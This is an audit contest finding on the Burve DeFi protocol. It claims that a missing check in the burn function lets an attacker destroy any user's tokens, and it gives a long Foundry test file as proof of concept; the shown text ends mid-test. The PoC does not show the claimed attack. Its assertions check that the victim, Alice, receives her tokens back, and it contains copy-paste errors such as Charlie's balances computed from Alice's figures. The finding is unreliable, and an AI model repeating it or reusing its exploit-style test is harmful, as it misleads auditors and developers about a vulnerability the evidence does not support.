Energetic Beige Boa

High

# The attacker will burn all the assets or tokens leaving the users with nothing

### Summary

The missing check on `Burve.sol` will cause a complete loss of funds for the users as the attacker will burn all their assets/tokens.

https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/single/Burve.sol#L350-L407


### Root Cause

In `Burve.sol:350` there is a missing check on the burn function.

### Internal Pre-conditions

1. Attacker to call burn on unsuspecting user.
2. The attacker needs to know roughly how much assets/tokens the user has.
3. Leading to zero assets in the contract for the particular user.

### External Pre-conditions

1. The users public addresses should be known to the attacker.
2. The amount the user has in tokens or assets also needs to be known.

### Attack Path

1. The attacker calls burn on a users assets/tokens.
2. The user is left crypto-less. 

### Impact

The protocol loses ETH/Asset tokens from the attacker being able to burn all assets on behalf of each user. Leaving the user asset-less. 

### PoC

The foundry test
The address is address(0xfeef419);
Path:= Burve/test/single/Burve4.t.sol
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import {StdUtils} from "forge-std/StdUtils.sol";

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

import {AdminLib} from "Commons/Util/Admin.sol";
import {ForkableTest} from "Commons/Test/ForkableTest.sol";

import {Mainnet} from "../utils/BerachainAddresses.sol";
import {Burve} from "../../src/single/Burve.sol";
import {BurveExposedInternal} from "./BurveExposedInternal.sol";
import {FeeLib} from "../../src/single/Fees.sol";
import {FullMath} from "../../src/FullMath.sol";
import {IKodiakIsland} from "../../src/single/integrations/kodiak/IKodiakIsland.sol";
import {Info} from "../../src/single/Info.sol";
import {IStationProxy} from "../../src/single/IStationProxy.sol";
import {IUniswapV3SwapCallback} from "../../src/single/integrations/kodiak/pool/IUniswapV3SwapCallback.sol";
import {IUniswapV3Pool} from "../../src/single/integrations/kodiak/IUniswapV3Pool.sol";
import {LiquidityAmounts} from "../../src/single/integrations/uniswap/LiquidityAmounts.sol";
import {NullStationProxy} from "./NullStationProxy.sol";
import {TickMath} from "../../src/single/integrations/uniswap/TickMath.sol";
import {TickRange} from "../../src/single/TickRange.sol";

uint256 constant QUERY_BURN_ALLOWED_APPROX_DELTA = 5;
uint256 constant TVL_BURN_ALLOWED_APPROX_DELTA = 10;

contract Burve4Test is ForkableTest, IUniswapV3SwapCallback {
    uint256 private constant X96_MASK = (1 << 96) - 1;
    uint256 private constant UNIT_NOMINAL_LIQ_X64 = 1 << 64;

    BurveExposedInternal public burveIsland; // island only
    BurveExposedInternal public burveV3; // v3 only
    BurveExposedInternal public burve; // island + v3

    IUniswapV3Pool pool;
    IERC20 token0;
    IERC20 token1;

    IStationProxy stationProxy;

    address alice;
    address charlie;
    address sender;

    function forkSetup() internal virtual override {
        alice = makeAddr("Alice");
        charlie = makeAddr("Charlie");
        sender = makeAddr("Sender");

        stationProxy = new NullStationProxy();

        // Pool info
        pool = IUniswapV3Pool(Mainnet.KODIAK_WBERA_HONEY_POOL_V3);
        token0 = IERC20(pool.token0());
        token1 = IERC20(pool.token1());

        int24 tickSpacing = pool.tickSpacing();
        int24 clampedCurrentTick = getClampedCurrentTick();

        // Burve Island
        TickRange[] memory islandRanges = new TickRange[](1);
        islandRanges[0] = TickRange(0, 0);

        uint128[] memory islandWeights = new uint128[](1);
        islandWeights[0] = 1;

        burveIsland = new BurveExposedInternal(
            Mainnet.KODIAK_WBERA_HONEY_POOL_V3,
            Mainnet.KODIAK_WBERA_HONEY_ISLAND,
            address(stationProxy),
            islandRanges,
            islandWeights
        );

        // Burve V3
        int24 v3RangeWidth = 10 * tickSpacing;
        TickRange[] memory v3Ranges = new TickRange[](1);
        v3Ranges[0] = TickRange(
            clampedCurrentTick - v3RangeWidth,
            clampedCurrentTick + v3RangeWidth
        );

        uint128[] memory v3Weights = new uint128[](1);
        v3Weights[0] = 1;

        burveV3 = new BurveExposedInternal(
            Mainnet.KODIAK_WBERA_HONEY_POOL_V3,
            address(0x0),
            address(stationProxy),
            v3Ranges,
            v3Weights
        );

        // Burve
        int24 rangeWidth = 100 * tickSpacing;
        TickRange[] memory ranges = new TickRange[](2);
        ranges[0] = TickRange(0, 0);
        ranges[1] = TickRange(
            clampedCurrentTick - rangeWidth,
            clampedCurrentTick + rangeWidth
        );

        uint128[] memory weights = new uint128[](2);
        weights[0] = 3;
        weights[1] = 1;

        burve = new BurveExposedInternal(
            Mainnet.KODIAK_WBERA_HONEY_POOL_V3,
            Mainnet.KODIAK_WBERA_HONEY_ISLAND,
            address(stationProxy),
            ranges,
            weights
        );
    }

    function postSetup() internal override {
        vm.label(Mainnet.KODIAK_WBERA_HONEY_POOL_V3, "HONEY_NECT_POOL_V3");
        vm.label(Mainnet.KODIAK_WBERA_HONEY_ISLAND, "HONEY_NECT_ISLAND");
    }

    // Create Tests

    function test_Create() public view forkOnly {
        assertEq(
            address(burve.pool()),
            Mainnet.KODIAK_WBERA_HONEY_POOL_V3,
            "pool"
        );
        assertEq(address(burve.token0()), pool.token0(), "token0");
        assertEq(address(burve.token1()), pool.token1(), "token1");
        assertEq(
            address(burve.island()),
            Mainnet.KODIAK_WBERA_HONEY_ISLAND,
            "island"
        );
        assertEq(
            address(burve.stationProxy()),
            address(stationProxy),
            "station proxy"
        );

        (int24 lower, int24 upper) = burve.ranges(0);
        assertEq(lower, 0, "island range lower");
        assertEq(upper, 0, "island range upper");

        (lower, upper) = burve.ranges(1);
        int24 tickSpacing = pool.tickSpacing();
        int24 clampedCurrentTick = getClampedCurrentTick();
        int24 rangeWidth = 100 * tickSpacing;
        assertEq(lower, clampedCurrentTick - rangeWidth, "v3 range lower");
        assertEq(upper, clampedCurrentTick + rangeWidth, "v3 range upper");

        assertEq(burve.distX96(0), (3 << 96) / 4, "island distX96");
        assertEq(burve.distX96(1), (1 << 96) / 4, "v3 distX96");
    }


// Burn Tests

    function test_Burn_IslandFull419() public forkOnly {
        uint128 mintLiq = 10_000;

        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);
        vm.startPrank(sender);
        token0.approve(address(burveIsland), type(uint256).max);
        token1.approve(address(burveIsland), type(uint256).max);
        burveIsland.testMint(address(alice), mintLiq, 0, type(uint128).max);
        vm.stopPrank();

        // Burn
        IKodiakIsland island = burveIsland.island();

        // calc island burn
        uint256 burnIslandShares = burveIsland.islandSharesPerOwner(alice);
        uint128 islandBurnLiq = islandSharesToLiquidity(
            island,
            burnIslandShares
        );
        (uint256 burn0, uint256 burn1) = getAmountsForLiquidity(
            islandBurnLiq,
            island.lowerTick(),
            island.upperTick(),
            false
        );

        vm.startPrank(address(0xfeef419));

        // approve transfer
        burveIsland.approve(address(burveIsland), mintLiq);

        // check burn event
        vm.expectEmit(true, false, false, true);
        emit Burve.Burn(alice, mintLiq, burnIslandShares);

        // burn
        burveIsland.burn(mintLiq, 0, type(uint128).max);

        vm.stopPrank();

        // check liq
        assertEq(burveIsland.totalNominalLiq(), 0, "total liq nominal");

        // check shares
        assertEq(burveIsland.totalShares(), 0, "total shares");

        // check island shares
        assertEq(burveIsland.totalIslandShares(), 0, "total island shares");

        // check pool token balances
        assertGe(
            token0.balanceOf(address(alice)),
            burn0,
            "alice token0 balance"
        );
        assertGe(
            token1.balanceOf(address(alice)),
            burn1,
            "alice token1 balance"
        );

        // check island LP token
        assertEq(
            burveIsland.islandSharesPerOwner(alice),
            0,
            "alice islandSharesPerOwner balance"
        );
        assertEq(island.balanceOf(alice), 0, "alice island LP balance");
        assertEq(
            island.balanceOf(address(stationProxy)),
            0,
            "station proxy island LP balance"
        );

        // check burve LP token
        assertEq(burveIsland.balanceOf(alice), 0, "alice burve LP balance");
    }

    function test_Burn_IslandPartial419() public forkOnly {
        uint128 mintLiq = 10_000;
        uint128 burnLiq = 1_000;

        // Mint
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);
        vm.startPrank(sender);
        token0.approve(address(burveIsland), type(uint256).max);
        token1.approve(address(burveIsland), type(uint256).max);
        burveIsland.testMint(address(alice), mintLiq, 0, type(uint128).max);
        vm.stopPrank();

        // Burn
        IKodiakIsland island = burveIsland.island();

        // calc island burn
        uint256 islandShares = burveIsland.islandSharesPerOwner(alice);
        uint256 burnIslandShares = FullMath.mulDiv(
            islandShares,
            burnLiq,
            mintLiq
        );

        uint128 islandBurnLiq = islandSharesToLiquidity(
            island,
            burnIslandShares
        );
        (uint256 burn0, uint256 burn1) = getAmountsForLiquidity(
            islandBurnLiq,
            island.lowerTick(),
            island.upperTick(),
            false
        );

        vm.startPrank(address(0xfeef419));

        // approve transfer
        burveIsland.approve(address(burveIsland), burnLiq);

        // check burn event
        vm.expectEmit(true, false, false, true);
        emit Burve.Burn(alice, burnLiq, burnIslandShares);

        // burn
        burveIsland.burn(burnLiq, 0, type(uint128).max);

        vm.stopPrank();

        // check liq
        assertEq(
            burveIsland.totalNominalLiq(),
            mintLiq - burnLiq,
            "total liq nominal"
        );

        // check shares
        assertEq(burveIsland.totalShares(), mintLiq - burnLiq, "total shares");

        // check island shares
        assertEq(
            burveIsland.totalIslandShares(),
            islandShares - burnIslandShares,
            "total island shares"
        );

        // check pool token balances
        assertGe(
            token0.balanceOf(address(alice)),
            burn0,
            "alice token0 balance"
        );
        assertGe(
            token1.balanceOf(address(alice)),
            burn1,
            "alice token1 balance"
        );

        // check island LP token
        assertEq(
            burveIsland.islandSharesPerOwner(alice),
            islandShares - burnIslandShares,
            "alice islandSharesPerOwner balance"
        );
        assertEq(island.balanceOf(alice), 0, "alice island LP balance");
        assertEq(
            island.balanceOf(address(stationProxy)),
            islandShares - burnIslandShares,
            "station proxy island LP balance"
        );

        // check burve LP token
        assertEq(
            burveIsland.balanceOf(alice),
            mintLiq - burnLiq,
            "alice burve LP balance"
        );
    }

    function test_Burn_V3Full419() public forkOnly {
        uint128 mintLiq = 10_000;

        // Mint
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);
        vm.startPrank(sender);
        token0.approve(address(burveV3), type(uint256).max);
        token1.approve(address(burveV3), type(uint256).max);
        burveV3.testMint(address(alice), mintLiq, 0, type(uint128).max);
        vm.stopPrank();

        // Burn

        // calc v3 burn
        (int24 lower, int24 upper) = burveV3.ranges(0);
        (uint256 burn0, uint256 burn1) = getAmountsForLiquidity(
            mintLiq,
            lower,
            upper,
            false
        );

        vm.startPrank(address(0xfeef419));

        // approve transfer
        burveV3.approve(address(burveV3), mintLiq);

        // check burn event
        vm.expectEmit(true, false, false, true);
        emit Burve.Burn(alice, mintLiq, 0);

        // burn
        burveV3.burn(mintLiq, 0, type(uint128).max);

        vm.stopPrank();

        // check liq
        assertEq(burveV3.totalNominalLiq(), 0, "total liq nominal");

        // check shares
        assertEq(burveV3.totalShares(), 0, "total shares");

        // check pool token balances
        assertGe(
            token0.balanceOf(address(alice)),
            burn0,
            "alice token0 balance"
        );
        assertGe(
            token1.balanceOf(address(alice)),
            burn1,
            "alice token1 balance"
        );

        // check burve LP token
        assertEq(burveIsland.balanceOf(alice), 0, "alice burve LP balance");
    }

    function test_Burn_V3Partial419() public forkOnly {
        uint128 mintLiq = 10_000;
        uint128 burnLiq = 1_000;

        // Mint
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);
        vm.startPrank(sender);
        token0.approve(address(burveV3), type(uint256).max);
        token1.approve(address(burveV3), type(uint256).max);
        burveV3.testMint(address(alice), mintLiq, 0, type(uint128).max);
        vm.stopPrank();

        // Burn

        // calc v3 burn
        (int24 lower, int24 upper) = burveV3.ranges(0);
        (uint256 burn0, uint256 burn1) = getAmountsForLiquidity(
            burnLiq,
            lower,
            upper,
            false
        );

        vm.startPrank(address(0xfeef419));

        // approve transfer
        burveV3.approve(address(burveV3), burnLiq);

        // check burn event
        vm.expectEmit(true, false, false, true);
        emit Burve.Burn(alice, burnLiq, 0);

        // burn
        burveV3.burn(burnLiq, 0, type(uint128).max);

        vm.stopPrank();

        // check liq
        assertEq(
            burveV3.totalNominalLiq(),
            mintLiq - burnLiq,
            "total liq nominal"
        );

        // check shares
        assertEq(burveV3.totalShares(), mintLiq - burnLiq, "total shares");

        // check pool token balances
        assertGe(
            token0.balanceOf(address(alice)),
            burn0,
            "alice token0 balance"
        );
        assertGe(
            token1.balanceOf(address(alice)),
            burn1,
            "alice token1 balance"
        );

        // check burve LP token
        assertEq(
            burveV3.balanceOf(alice),
            mintLiq - burnLiq,
            "alice burve LP balance"
        );
    }

    function test_Burn_Full419() public forkOnly {
        uint128 mintLiq = 10_000;

        // Mint
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);
        vm.startPrank(sender);
        token0.approve(address(burve), type(uint256).max);
        token1.approve(address(burve), type(uint256).max);
        burve.testMint(address(alice), mintLiq, 0, type(uint128).max);
        vm.stopPrank();

        // Burn
        IKodiakIsland island = burve.island();

        // calc island burn
        uint256 burnIslandShares = burve.islandSharesPerOwner(alice);
        uint128 islandBurnLiq = islandSharesToLiquidity(
            island,
            burnIslandShares
        );
        (uint256 islandBurn0, uint256 islandBurn1) = getAmountsForLiquidity(
            islandBurnLiq,
            island.lowerTick(),
            island.upperTick(),
            false
        );

        // calc v3 burn
        uint128 v3BurnLiq = uint128(shift96(mintLiq * burve.distX96(1), false));
        (int24 lower, int24 upper) = burve.ranges(1);
        (uint256 v3Burn0, uint256 v3Burn1) = getAmountsForLiquidity(
            v3BurnLiq,
            lower,
            upper,
            false
        );

        uint256 burn0 = islandBurn0 + v3Burn0;
        uint256 burn1 = islandBurn1 + v3Burn1;

        vm.startPrank(address(0xfeef419));

        // approve transfer
        burve.approve(address(burve), mintLiq);

        // check burn event
        vm.expectEmit(true, false, false, true);
        emit Burve.Burn(alice, mintLiq, burnIslandShares);

        // burn
        burve.burn(mintLiq, 0, type(uint128).max);

        vm.stopPrank();

        // check liq
        assertEq(burve.totalNominalLiq(), 0, "total liq nominal");

        // check shares
        assertEq(burve.totalShares(), 0, "total shares");

        // check island shares
        assertEq(burveIsland.totalIslandShares(), 0, "total island shares");

        // check pool token balances
        assertGe(
            token0.balanceOf(address(alice)),
            burn0,
            "alice token0 balance"
        );
        assertGe(
            token1.balanceOf(address(alice)),
            burn1,
            "alice token1 balance"
        );

        // check island LP token
        assertEq(
            burve.islandSharesPerOwner(alice),
            0,
            "alice islandSharesPerOwner balance"
        );
        assertEq(island.balanceOf(alice), 0, "alice island LP balance");
        assertEq(
            island.balanceOf(address(stationProxy)),
            0,
            "station proxy island LP balance"
        );

        // check burve LP token
        assertEq(burve.balanceOf(alice), 0, "alice burve LP balance");
    }

    function test_Burn_Partial419() public forkOnly {
        uint128 mintLiq = 10_000;
        uint128 burnLiq = 1_000;

        // Mint
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);
        vm.startPrank(sender);
        token0.approve(address(burve), type(uint256).max);
        token1.approve(address(burve), type(uint256).max);
        burve.testMint(address(alice), mintLiq, 0, type(uint128).max);
        vm.stopPrank();

        // Burn
        IKodiakIsland island = burve.island();

        // calc island burn
        uint256 islandShares = burve.islandSharesPerOwner(alice);
        uint256 burnIslandShares = FullMath.mulDiv(
            islandShares,
            burnLiq,
            mintLiq
        );

        uint128 islandBurnLiq = islandSharesToLiquidity(
            island,
            burnIslandShares
        );
        (uint256 islandBurn0, uint256 islandBurn1) = getAmountsForLiquidity(
            islandBurnLiq,
            island.lowerTick(),
            island.upperTick(),
            false
        );

        // calc v3 burn
        uint128 v3BurnLiq = uint128(shift96(burnLiq * burve.distX96(1), false));
        (int24 lower, int24 upper) = burve.ranges(1);
        (uint256 v3Burn0, uint256 v3Burn1) = getAmountsForLiquidity(
            v3BurnLiq,
            lower,
            upper,
            false
        );

        uint256 burn0 = islandBurn0 + v3Burn0;
        uint256 burn1 = islandBurn1 + v3Burn1;

        vm.startPrank(address(0xfeef419));

        // approve transfer
        burve.approve(address(burve), burnLiq);

        // check burn event
        vm.expectEmit(true, false, false, true);
        emit Burve.Burn(alice, burnLiq, burnIslandShares);

        // burn
        burve.burn(burnLiq, 0, type(uint128).max);

        vm.stopPrank();

        // check liq
        assertEq(
            burve.totalNominalLiq(),
            mintLiq - burnLiq,
            "total liq nominal"
        );

        // check shares
        assertEq(burve.totalShares(), mintLiq - burnLiq, "total shares");

        // check island shares
        assertEq(
            burve.totalIslandShares(),
            islandShares - burnIslandShares,
            "total island shares"
        );

        // check pool token balances
        assertGe(
            token0.balanceOf(address(alice)),
            burn0,
            "alice token0 balance"
        );
        assertGe(
            token1.balanceOf(address(alice)),
            burn1,
            "alice token1 balance"
        );

        // check island LP token
        assertEq(
            burve.islandSharesPerOwner(alice),
            islandShares - burnIslandShares,
            "alice islandSharesPerOwner balance"
        );
        assertEq(island.balanceOf(alice), 0, "alice island LP balance");
        assertEq(
            island.balanceOf(address(stationProxy)),
            islandShares - burnIslandShares,
            "station proxy island LP balance"
        );

        // check burve LP token
        assertEq(
            burve.balanceOf(alice),
            mintLiq - burnLiq,
            "alice burve LP balance"
        );
    }

    function test_QueryValue_Island_NoFees419() public forkOnly {
        uint128 aliceMintLiq = 100_000_000_000;
        uint128 charlieMintLiq = 20_000_000_000;

        // execute mints
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);

        vm.startPrank(sender);

        token0.approve(address(burveIsland), type(uint256).max);
        token1.approve(address(burveIsland), type(uint256).max);

        burveIsland.testMint(
            address(alice),
            aliceMintLiq,
            0,
            type(uint128).max
        );
        burveIsland.testMint(
            address(charlie),
            charlieMintLiq,
            0,
            type(uint128).max
        );

        vm.stopPrank();

        // query
        (uint256 queryAlice0, uint256 queryAlice1) = burveIsland.queryValue(
            alice
        );
        (uint256 queryCharlie0, uint256 queryCharlie1) = burveIsland.queryValue(
            charlie
        );
        (uint256 tvl0, uint256 tvl1) = burveIsland.queryTVL();

        // burn
        uint256 priorBalanceAlice0 = token0.balanceOf(address(alice));
        uint256 priorBalanceAlice1 = token1.balanceOf(address(alice));

        uint256 priorBalanceCharlie0 = token0.balanceOf(address(charlie));
        uint256 priorBalanceCharlie1 = token1.balanceOf(address(charlie));

        vm.startPrank(address(0xfeef419));
        burveIsland.burn(burveIsland.balanceOf(alice), 0, type(uint128).max);
        vm.stopPrank();

        vm.startPrank(charlie);
        burveIsland.burn(burveIsland.balanceOf(charlie), 0, type(uint128).max);
        vm.stopPrank();

        uint256 burnAlice0 = token0.balanceOf(alice) - priorBalanceAlice0;
        uint256 burnAlice1 = token1.balanceOf(alice) - priorBalanceAlice1;
        assertGt(burnAlice0, 0, "burn alice token0");
        assertGt(burnAlice1, 0, "burn alice token1");

        uint256 burnCharlie0 = token0.balanceOf(charlie) - priorBalanceAlice0;
        uint256 burnCharlie1 = token1.balanceOf(charlie) - priorBalanceAlice1;
        assertGt(burnCharlie0, 0, "burn charlie token0");
        assertGt(burnCharlie1, 0, "burn charlie token1");

        // check query matches burn
        assertEq(queryAlice0, burnAlice0, "query alice token0 matches burn");
        assertEq(queryAlice1, burnAlice1, "query alice token1 matches burn");

        assertEq(
            queryCharlie0,
            burnCharlie0,
            "query charlie token0 matches burn"
        );
        assertEq(
            queryCharlie1,
            burnCharlie1,
            "query charlie token1 matches burn"
        );

        // check TVL
        assertApproxEqAbs(
            tvl0,
            burnAlice0 + burnCharlie0,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token0"
        );
        assertApproxEqAbs(
            tvl1,
            burnAlice1 + burnCharlie1,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token1"
        );
    }

    function test_QueryValue_Island_WithFees419() public forkOnly {
        uint128 aliceMintLiq = 100_000_000_000;
        uint128 charlieMintLiq = 20_000_000_000;

        // execute mints
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);

        vm.startPrank(sender);

        token0.approve(address(burveIsland), type(uint256).max);
        token1.approve(address(burveIsland), type(uint256).max);

        burveIsland.testMint(
            address(alice),
            aliceMintLiq,
            0,
            type(uint128).max
        );
        burveIsland.testMint(
            address(charlie),
            charlieMintLiq,
            0,
            type(uint128).max
        );

        vm.stopPrank();

        // query w/o fees
        (uint256 queryNoFeeAlice0, uint256 queryNoFeeAlice1) = burveIsland
            .queryValue(alice);
        (uint256 queryNoFeeCharlie0, uint256 queryNoFeeCharlie1) = burveIsland
            .queryValue(charlie);

        // accumulate fees
        (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();

        deal(address(token0), address(this), 100_100_000e18);
        deal(address(token1), address(this), 100_100_000e18);

        pool.swap(
            address(this),
            true,
            100_100_000e18,
            TickMath.MIN_SQRT_RATIO + 1,
            new bytes(0)
        );
        pool.swap(
            address(this),
            false,
            100_100_000e18,
            sqrtPriceX96,
            new bytes(0)
        );

        vm.roll(block.timestamp * 100_000);

        (uint160 postSqrtPriceX96, , , , , , ) = pool.slot0();
        assertEq(
            postSqrtPriceX96,
            sqrtPriceX96,
            "swapped sqrt price back to original"
        );

        // query w/ fees
        (uint256 queryWithFeeAlice0, uint256 queryWithFeeAlice1) = burveIsland
            .queryValue(alice);
        (
            uint256 queryWithFeeCharlie0,
            uint256 queryWithFeeCharlie1
        ) = burveIsland.queryValue(charlie);
        (uint256 tvl0, uint256 tvl1) = burveIsland.queryTVL();

        // burn
        uint256 priorBalanceAlice0 = token0.balanceOf(address(alice));
        uint256 priorBalanceAlice1 = token1.balanceOf(address(alice));

        uint256 priorBalanceCharlie0 = token0.balanceOf(address(charlie));
        uint256 priorBalanceCharlie1 = token1.balanceOf(address(charlie));

        vm.startPrank(address(0xfeef419));
        burveIsland.burn(burveIsland.balanceOf(alice), 0, type(uint128).max);
        vm.stopPrank();

        vm.startPrank(charlie);
        burveIsland.burn(burveIsland.balanceOf(charlie), 0, type(uint128).max);
        vm.stopPrank();

        uint256 burnAlice0 = token0.balanceOf(alice) - priorBalanceAlice0;
        uint256 burnAlice1 = token1.balanceOf(alice) - priorBalanceAlice1;
        assertGt(burnAlice0, 0, "burn alice token0");
        assertGt(burnAlice1, 0, "burn alice token1");

        uint256 burnCharlie0 = token0.balanceOf(charlie) - priorBalanceAlice0;
        uint256 burnCharlie1 = token1.balanceOf(charlie) - priorBalanceAlice1;
        assertGt(burnCharlie0, 0, "burn charlie token0");
        assertGt(burnCharlie1, 0, "burn charlie token1");

        // check query fee matches burn
        assertEq(
            queryWithFeeAlice0,
            burnAlice0,
            "query alice token0 matches burn"
        );
        assertEq(
            queryWithFeeAlice1,
            burnAlice1,
            "query alice token1 matches burn"
        );

        assertEq(
            queryWithFeeCharlie0,
            burnCharlie0,
            "query charlie token0 matches burn"
        );
        assertEq(
            queryWithFeeCharlie1,
            burnCharlie1,
            "query charlie token1 matches burn"
        );

        // check fees accumulated
        assertGt(
            queryWithFeeAlice0,
            queryNoFeeAlice0,
            "query alice earned token0"
        );
        assertGt(
            queryWithFeeAlice1,
            queryNoFeeAlice1,
            "query alice earned token1"
        );

        assertGt(
            queryWithFeeCharlie0,
            queryNoFeeCharlie0,
            "query charlie earned token0"
        );
        assertGt(
            queryWithFeeCharlie1,
            queryNoFeeCharlie1,
            "query charlie earned token1"
        );

        // check TVL
        assertApproxEqAbs(
            tvl0,
            burnAlice0 + burnCharlie0,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token0"
        );
        assertApproxEqAbs(
            tvl1,
            burnAlice1 + burnCharlie1,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token1"
        );
    }

    function test_QueryValue_V3_NoFees419() public forkOnly {
        uint128 aliceMintLiq = 100_000_000_000;
        uint128 charlieMintLiq = 20_000_000_000;

        // execute mints
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);

        vm.startPrank(sender);

        token0.approve(address(burveV3), type(uint256).max);
        token1.approve(address(burveV3), type(uint256).max);

        burveV3.testMint(address(alice), aliceMintLiq, 0, type(uint128).max);
        burveV3.testMint(
            address(charlie),
            charlieMintLiq,
            0,
            type(uint128).max
        );

        vm.stopPrank();

        // query
        (uint256 queryAlice0, uint256 queryAlice1) = burveV3.queryValue(alice);
        (uint256 queryCharlie0, uint256 queryCharlie1) = burveV3.queryValue(
            charlie
        );
        (uint256 tvl0, uint256 tvl1) = burveV3.queryTVL();

        // burn
        uint256 priorBalanceAlice0 = token0.balanceOf(address(alice));
        uint256 priorBalanceAlice1 = token1.balanceOf(address(alice));

        uint256 priorBalanceCharlie0 = token0.balanceOf(address(charlie));
        uint256 priorBalanceCharlie1 = token1.balanceOf(address(charlie));

        vm.startPrank(address(0xfeef419));
        burveV3.burn(burveV3.balanceOf(alice), 0, type(uint128).max);
        vm.stopPrank();

        vm.startPrank(charlie);
        burveV3.burn(burveV3.balanceOf(charlie), 0, type(uint128).max);
        vm.stopPrank();

        uint256 burnAlice0 = token0.balanceOf(alice) - priorBalanceAlice0;
        uint256 burnAlice1 = token1.balanceOf(alice) - priorBalanceAlice1;
        assertGt(burnAlice0, 0, "burn alice token0");
        assertGt(burnAlice1, 0, "burn alice token1");

        uint256 burnCharlie0 = token0.balanceOf(charlie) - priorBalanceAlice0;
        uint256 burnCharlie1 = token1.balanceOf(charlie) - priorBalanceAlice1;
        assertGt(burnCharlie0, 0, "burn charlie token0");
        assertGt(burnCharlie1, 0, "burn charlie token1");

        // check query matches burn
        assertEq(queryAlice0, burnAlice0, "query alice token0 matches burn");
        assertEq(queryAlice1, burnAlice1, "query alice token1 matches burn");

        assertEq(
            queryCharlie0,
            burnCharlie0,
            "query charlie token0 matches burn"
        );
        assertEq(
            queryCharlie1,
            burnCharlie1,
            "query charlie token1 matches burn"
        );

        // check TVL
        assertApproxEqAbs(
            tvl0,
            burnAlice0 + burnCharlie0,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token0"
        );
        assertApproxEqAbs(
            tvl1,
            burnAlice1 + burnCharlie1,
            TVL_BURN_ALLOWED_APPROX_DELTA,
            "tvl token1"
        );
    }

    function test_QueryValue_V3_WithFees419() public forkOnly {
        uint128 aliceMintLiq = 100_000_000_000;
        uint128 charlieMintLiq = 20_000_000_000;

        // execute mints
        deal(address(token0), address(sender), type(uint256).max);
        deal(address(token1), address(sender), type(uint256).max);

        vm.startPrank(sender);

        token0.approve(address(burveV3), type(uint256).max);
        token1.approve(address(burveV3), type(uint256).max);

        burveV3.testMint(address(alice), aliceMintLiq, 0, type(uint128).max);
        burveV3.testMint(
            address(charlie),
            charlieMintLiq,
            0,
            type(uint128).max
        );

        vm.stopPrank();

        // query w/o fees
        (uint256 queryNoFeeAlice0, uint256 queryNoFeeAlice1) = burveV3
            .queryValue(alice);
        (uint256 queryNoFeeCharlie0, uint256 queryNoFeeCharlie1) = burveV3
            .queryValue(charlie);

        // accumulate fees
        (uint160 sqrtPriceX96, , , , , , ) = pool.slot0();

        deal(address(token0), address(this), 100_100_000e18);
        deal(address(token1), address(this), 100_100_000e18);

        pool.swap(
            address(this),
            true,
            100_100_000e18,
            TickMath.MIN_SQRT_RATIO + 1,
            new bytes(0)
        );
        pool.swap(
            address(this),
            false,
            100_100_000e18,
            sqrtPriceX96,
            new bytes(0)
        );

        vm.roll(block.timestamp * 100_000);

        (uint160 postSqrtPriceX96, , , , , , ) = pool.slot0();
        assertEq(
            postSqrtPriceX96,
            sqrtPriceX96,
            "swapped sqrt price back to original"
        );

        // query w/ fees
        (uint256 queryWithFeeAlice0, uint256 queryWithFeeAlice1) = burveV3
            .queryValue(alice);
        (uint256 queryWithFeeCharlie0, uint256 queryWithFeeCharlie1) = burveV3
            .queryValue(charlie);
        (uint256 tvl0, uint256 tvl1) = burveV3.queryTVL();

        // burn
        uint256 priorBalanceAlice0 = token0.balanceOf(address(alice));
        uint256 priorBalanceAlice1 = token1.balanceOf(address(alice));

        uint256 priorBalanceCharlie0 = token0.balanceOf(address(charlie));
        uint256 priorBalanceCharlie1 = token1.balanceOf(address(charlie));

        vm.startPrank(address(0xfeef419));
        burveV3.burn(burveV3.balanceOf(alice), 0, type(uint128).max);
        vm.stopPrank();

        vm.startPrank(charlie);
        burveV3.burn(burveV3.balanceOf(charlie), 0, type(uint128).max);
        vm.stopPrank();

        uint256 burnAlice0 = token0.balanceOf(alice) - priorBalanceAlice0;
        uint256 burnAlice1 = token1.balanceOf(alice) - priorBalanceAlice1;
        assertGt(burnAlice0, 0, "burn alice token0");
        assertGt(burnAlice1, 0, "burn alice token1");

        uint256 burnCharlie0 = token0.balanceOf(charlie) - priorBalanceAlice0;
        uint256 burnCharlie1 = token1.balanceOf(charlie) - priorBalanceAlice1;
        assertGt(burnCharlie0, 0, "burn charlie token0");
        assertGt(burnCharlie1, 0, "burn charlie token1");

        // check leftover
        uint256 leftover0 = token0.balanceOf(address(burveV3));
        uint256 leftover1 = token1.balanceOf(address(burveV3));
        assertTrue(
            leftover0 > 0 || leftover1 > 0,
            "leftover amount exists that was not compounded"
        );

        // check query nearly matches burn
        assertApproxEqAbs(
            queryWithFeeAlice0,
            burnAlice0,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query alice token0 matches burn"
        );
        assertApproxEqAbs(
            queryWithFeeAlice1,
            burnAlice1,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query alice token1 matches burn"
        );

        assertApproxEqAbs(
            queryWithFeeCharlie0,
            burnCharlie0,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query charlie token0 matches burn"
        );
        assertApproxEqAbs(
            queryWithFeeCharlie1,
            burnCharlie1,
            QUERY_BURN_ALLOWED_APPROX_DELTA,
            "query charlie token1 matches burn"
        );

        // check query underestimates burn
        assertLe(queryWithFeeAlice0, burnAlice0, "query alice token0 Le burn");
        assertLe(queryWithFeeAlice1, burnAlice1, "query alice token1 Le burn");

